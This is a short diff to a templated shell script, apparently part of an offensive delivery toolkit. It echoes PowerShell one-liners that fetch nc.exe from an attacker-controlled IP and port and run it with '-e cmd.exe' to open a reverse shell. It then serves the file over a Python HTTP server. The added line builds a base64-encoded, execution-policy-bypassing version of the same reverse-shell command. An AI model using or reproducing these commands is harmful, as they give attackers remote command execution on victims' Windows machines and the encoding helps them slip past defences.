@@ -7,5 +7,6 @@ echo '================================================================'; \
 echo '                         -----CMD-----                          '; \
 echo 'Deliver only: powershell wget -uri http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/nc.exe -Outfile <%=$(esh variables/delivery_path_windows)%>\nc.exe'; \
 echo 'Deliver + RevShell: powershell wget -uri http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/nc.exe -Outfile <%=$(esh variables/delivery_path_windows)%>\nc.exe; <%=$(esh variables/delivery_path_windows)%>\nc.exe -e cmd.exe <%=$(esh variables/attacker_ip)%> <%=$(esh variables/shell_port)%>'; \
+echo 'Deliver + RevShell (encoded): powershell.exe -ExecutionPolicy Bypass -EncodedCommand <%="powershell wget -uri http://"$(esh variables/attacker_ip)":"$(esh variables/delivery_outbound_port)"/nc.exe -Outfile "$(esh variables/delivery_path_windows)"\nc.exe; "$(esh variables/delivery_path_windows)"\nc.exe -e cmd.exe "$(esh variables/attacker_ip)" "$(esh variables/shell_port) | python helper_scripts/encode.py --base64pwsh %>'; \
 echo '================================================================'; \
 python -m http.server <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
